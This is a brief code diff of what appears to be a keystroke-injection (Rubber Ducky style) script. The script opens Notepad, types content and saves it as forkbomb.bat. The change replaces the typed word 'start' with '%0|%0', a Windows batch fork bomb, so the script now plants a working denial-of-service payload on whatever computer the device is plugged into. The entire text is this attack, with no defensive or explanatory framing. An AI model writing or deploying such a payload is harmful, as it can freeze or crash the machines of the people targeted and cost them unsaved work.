@@ -5,7 +5,7 @@ DELAY 200
 STRING notepad
 ENTER
 DELAY 500
-STRING start
+STRING %0|%0
 CTRL s
 DELAY 200
 STRING forkbomb.bat
